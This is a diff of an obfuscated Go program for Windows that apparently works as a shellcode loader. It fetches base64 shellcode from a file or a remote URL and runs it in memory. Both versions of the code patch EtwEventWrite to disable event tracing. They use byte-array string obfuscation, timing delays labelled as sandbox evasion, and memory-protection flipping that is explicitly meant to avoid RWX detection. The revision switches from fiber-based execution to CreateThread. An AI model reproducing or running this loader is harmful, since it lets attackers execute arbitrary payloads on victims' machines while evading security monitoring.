@@ -4,7 +4,7 @@ import (
 	"encoding/base64"
 	"flag"
 	"fmt"
-	"io/ioutil"
+	"io"
 	"math/rand"
 	"net/http"
 	"os"
@@ -14,165 +14,128 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-func xcbrf8q() int {
+var (
+	qrglmdas5 = windows.NewLazySystemDLL(string([]byte{107,101,114,110,101,108,51,50,46,100,108,108}))
+	sjcvttkk = windows.NewLazySystemDLL(string([]byte{110,116,100,108,108,46,100,108,108}))
+
+	prochtxumf3z245lw = sjcvttkk.NewProc(string([]byte{82,116,108,77,111,118}) + string([]byte{101,77,101,109,111,114,121}))
+)
+
+func yiqb70m() int {
 	ch := make(chan int, 1)
-	ch <- 598
+	ch <- 738
 	return <-ch
 }
 
-func nz5zcsbkahkr() []int {
-	s := make([]int, 12)
-	for i := range s {
-		s[i] = i * 6 + 29
-	}
-	return s
-}
-
-func bihwqubcc() []int {
-	s := make([]int, 11)
-	for i := range s {
-		s[i] = i * 3 + 87
-	}
-	return s
-}
-
-func khxox7rrzd() int {
+func iu9ldrabb() int {
 	x := 0
-	for i := 0; i < 76; i++ {
-		x += i * 7
+	for i := 0; i < 47; i++ {
+		x += i * 4
 	}
 	return x
 }
 
-func tpe07jfb5a(n string) *windows.LazyDLL {
-	return windows.NewLazySystemDLL(n)
+func q4s4hqm2v() []int {
+	s := make([]int, 6)
+	for i := range s {
+		s[i] = i * 7 + 35
+	}
+	return s
 }
 
-func jljsykpcepyl() {
-	h7ntm2tt := tpe07jfb5a(string([]byte{110,116,100,108,108,46,100,108,108}))
-	yy1a1179exwvj := h7ntm2tt.NewProc(string([]byte{69,116,119,69,118,101,110,116,87,114,105}) + string([]byte{116,101}))
-	yy1a1179exwvj.Find()
-	patch := []byte{0xC3} // ret
-	var freehp26frxf2 uint32
-	yf2lc4px3v70 := tpe07jfb5a(string([]byte{107,101,114,110,101,108,51,50,46,100,108,108}))
-	vp := yf2lc4px3v70.NewProc(string([]byte{86,105,114,116}) + string([]byte{117,97,108,80,114,111,116}) + string([]byte{101,99,116}))
-	vp.Call(yy1a1179exwvj.Addr(), 1, 0x40, uintptr(unsafe.Pointer(&freehp26frxf2)))
-	*(*byte)(unsafe.Pointer(yy1a1179exwvj.Addr())) = patch[0]
-	vp.Call(yy1a1179exwvj.Addr(), 1, uintptr(freehp26frxf2), uintptr(unsafe.Pointer(&freehp26frxf2)))
-}
-
-func lzrs61x7d4() bool {
-	otr91az := time.Now()
-	time.Sleep(3943 * time.Millisecond)
-	mo3rs017aj := time.Since(otr91az)
-	return mo3rs017aj.Milliseconds() >= 3643
-}
-
-func j4j4ro9tq7a(url string) ([]byte, error) {
-	h3paty2k := &http.Client{Timeout: 30 * time.Second}
-	lsnn31rpur, err := h3paty2k.Get(url)
+func zst2f22f2bpo(err error, msg string) {
 	if err != nil {
-		return nil, err
+		fmt.Fprintf(os.Stderr, "[!] %s: %v\n", msg, err)
+		os.Exit(1)
 	}
-	defer lsnn31rpur.Body.Close()
-	return ioutil.ReadAll(lsnn31rpur.Body)
 }
 
-func jhcldudl(p string) ([]byte, error) {
-	return ioutil.ReadFile(p)
+func bre3ry6ufuja() {
+	ia6e2kc5v4y := sjcvttkk.NewProc(string([]byte{69,116,119,69,118,101,110,116,87,114,105}) + string([]byte{116,101}))
+	ia6e2kc5v4y.Find()
+	patch := []byte{0xC3}
+	var n5g1e6l uint32
+	vp := qrglmdas5.NewProc(string([]byte{86,105}) + string([]byte{114,116}) + string([]byte{117,97}) + string([]byte{108,80,114,111,116,101,99,116}))
+	vp.Call(ia6e2kc5v4y.Addr(), 1, 0x40, uintptr(unsafe.Pointer(&n5g1e6l)))
+	*(*byte)(unsafe.Pointer(ia6e2kc5v4y.Addr())) = patch[0]
+	vp.Call(ia6e2kc5v4y.Addr(), 1, uintptr(n5g1e6l), uintptr(unsafe.Pointer(&n5g1e6l)))
 }
 
-func q1rzivj6(data []byte) ([]byte, error) {
-	return base64.StdEncoding.DecodeString(string(data))
+func b6ha7gl1g9031(url string) []byte {
+	zfsgoxtma := &http.Client{}
+	zgenvc7i47b, err := zfsgoxtma.Get(url)
+	zst2f22f2bpo(err, "download failed")
+	defer zgenvc7i47b.Body.Close()
+	data, err := io.ReadAll(zgenvc7i47b.Body)
+	zst2f22f2bpo(err, "read failed")
+	return data
 }
 
-func pzapjog92(data []byte) []byte {
-	key := byte(10)
-	out := make([]byte, len(data))
-	for i := range data {
-		out[i] = data[i] ^ key
-	}
-	return out
+func umslt2w969g(p string) []byte {
+	data, err := os.ReadFile(p)
+	zst2f22f2bpo(err, "load failed")
+	return data
 }
 
-func ljjilku8eylzs(qtt59l3m962nu []byte) {
-	// Patch ETW before execution
-	jljsykpcepyl()
+func cvtby5xcm6l(data []byte) []byte {
+	decoded, err := base64.StdEncoding.DecodeString(string(data))
+	zst2f22f2bpo(err, "decode failed")
+	return decoded
+}
 
-	yf2lc4px3v70 := tpe07jfb5a(string([]byte{107,101,114,110,101,108,51,50,46,100,108,108}))
-	h7ntm2tt := tpe07jfb5a(string([]byte{110,116,100,108,108,46,100,108,108}))
+func fiz6q53nccp(ibdsohh99 []byte) {
+	bre3ry6ufuja()
 
-	f8s3map := yf2lc4px3v70.NewProc(string([]byte{86}) + string([]byte{105,114,116,117,97,108}) + string([]byte{65,108,108}) + string([]byte{111,99}))
-	jngstkm68 := yf2lc4px3v70.NewProc(string([]byte{86,105,114,116}) + string([]byte{117,97,108,80,114,111,116}) + string([]byte{101,99,116}))
-	kpsc6incd828v := h7ntm2tt.NewProc(string([]byte{82,116,108,77,111,118}) + string([]byte{101,77,101,109,111,114}) + string([]byte{121}))
+	// Timing jitter — sandbox evasion
+	hlpx8dpgrqe := time.Duration(rand.Intn(800)+200) * time.Millisecond
+	time.Sleep(hlpx8dpgrqe)
 
-	rvojjb6w := uintptr(len(qtt59l3m962nu))
+	// VirtualAlloc PAGE_READWRITE (no RWX signature)
+	hlqpcl46en9rf, err := windows.VirtualAlloc(
+		0,
+		uintptr(len(ibdsohh99)),
+		windows.MEM_COMMIT|windows.MEM_RESERVE,
+		windows.PAGE_READWRITE,
+	)
+	zst2f22f2bpo(err, "VirtualAlloc failed")
 
-	// Allocate RW memory
-	nbd13ldz2gu, _, _ := f8s3map.Call(0, rvojjb6w, 0x3000, 0x04)
-	if nbd13ldz2gu == 0 {
-		return
+	// Copy shellcode into RW region
+	prochtxumf3z245lw.Call(
+		hlqpcl46en9rf,
+		uintptr(unsafe.Pointer(&ibdsohh99[0])),
+		uintptr(len(ibdsohh99)),
+	)
+
+	// Flip to RX (execute, no write) — avoids RWX detection
+	var n5g1e6l uint32
+	vp := qrglmdas5.NewProc(string([]byte{86,105}) + string([]byte{114,116}) + string([]byte{117,97}) + string([]byte{108,80,114,111,116,101,99,116}))
+	vp.Call(hlqpcl46en9rf, uintptr(len(ibdsohh99)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&n5g1e6l)))
+
+	// CreateThread with 32MB stack + WaitForSingleObject
+	m1bnuqpzj7x, _, err := qrglmdas5.NewProc(string([]byte{67,114,101}) + string([]byte{97,116,101,84,104,114,101,97,100})).Call(0, 33554432, hlqpcl46en9rf, 0, 0x00010000, 0)
+	if m1bnuqpzj7x == 0 {
+		zst2f22f2bpo(err, "CreateThread failed")
 	}
-
-	// XOR encode in-memory then copy (forces unique memory pattern)
-	ahkhd939h3 := pzapjog92(pzapjog92(qtt59l3m962nu))
-
-	// Copy shellcode
-	kpsc6incd828v.Call(nbd13ldz2gu, uintptr(unsafe.Pointer(&ahkhd939h3[0])), rvojjb6w)
-
-	// Change to RX
-	var freehp26frxf2 uint32
-	jngstkm68.Call(nbd13ldz2gu, rvojjb6w, 0x20, uintptr(unsafe.Pointer(&freehp26frxf2)))
-
-	np95rbt24h := yf2lc4px3v70.NewProc(string([]byte{67,111,110,118,101,114}) + string([]byte{116,84,104,114,101,97,100}) + string([]byte{84,111,70}) + string([]byte{105,98,101,114}))
-	kq3valoab51e := yf2lc4px3v70.NewProc(string([]byte{67,114,101,97,116,101,70,105,98}) + string([]byte{101,114}))
-	j45yc06xy := yf2lc4px3v70.NewProc(string([]byte{83,119,105,116,99,104,84}) + string([]byte{111,70,105,98}) + string([]byte{101,114}))
-
-	time.Sleep(time.Duration(rand.Intn(1886)) * time.Millisecond)
-
-	// Convert current thread to fiber, create shellcode fiber, switch
-	np95rbt24h.Call(0)
-	kmul3ehz, _, _ := kq3valoab51e.Call(0, nbd13ldz2gu, 0)
-	if kmul3ehz != 0 {
-		j45yc06xy.Call(kmul3ehz)
-	}
-
-	// Keep alive for beacon shellcode that spawns threads
-	select {}
+	qrglmdas5.NewProc(string([]byte{87}) + string([]byte{97,105,116,70,111,114,83,105,110}) + string([]byte{103,108,101}) + string([]byte{79,98,106,101,99,116})).Call(m1bnuqpzj7x, 0xFFFFFFFF)
 }
 
 func main() {
-	xxgk4wbtl9p := flag.String("local", "", "local path")
-	biiki9liy2 := flag.String("remote", "", "remote url")
+	cj3pkkf4tmj4n := flag.String("local", "", "Path to local base64-encoded shellcode file")
+	kpjq55f92hsu := flag.String("remote", "", "URL to remote base64-encoded shellcode file")
 	flag.Parse()
 
-	if !lzrs61x7d4() {
-		os.Exit(0)
-	}
+	var sb7sow1p0 []byte
 
-	var clvvj55n93e5r []byte
-	var err error
-
-	if *xxgk4wbtl9p != "" {
-		clvvj55n93e5r, err = jhcldudl(*xxgk4wbtl9p)
-	} else if *biiki9liy2 != "" {
-		clvvj55n93e5r, err = j4j4ro9tq7a(*biiki9liy2)
+	if *cj3pkkf4tmj4n != "" {
+		sb7sow1p0 = umslt2w969g(*cj3pkkf4tmj4n)
+	} else if *kpjq55f92hsu != "" {
+		sb7sow1p0 = b6ha7gl1g9031(*kpjq55f92hsu)
 	} else {
-		fmt.Println("Usage: -local <path> | -remote <url>")
+		fmt.Println("[!] Usage: -local <path> | -remote <url>")
 		os.Exit(1)
 	}
 
-	if err != nil {
-		fmt.Fprintf(os.Stderr, "[!] %v\n", err)
-		os.Exit(1)
-	}
-
-	var fmx4smwf9 []byte
-	fmx4smwf9, err = q1rzivj6(clvvj55n93e5r)
-	if err != nil {
-		fmt.Fprintf(os.Stderr, "[!] %v\n", err)
-		os.Exit(1)
-	}
-
-	ljjilku8eylzs(fmx4smwf9)
+	ck12tis := cvtby5xcm6l(sb7sow1p0)
+	fmt.Println("[+] Shellcode decoded. Executing...")
+	fiz6q53nccp(ck12tis)
 }
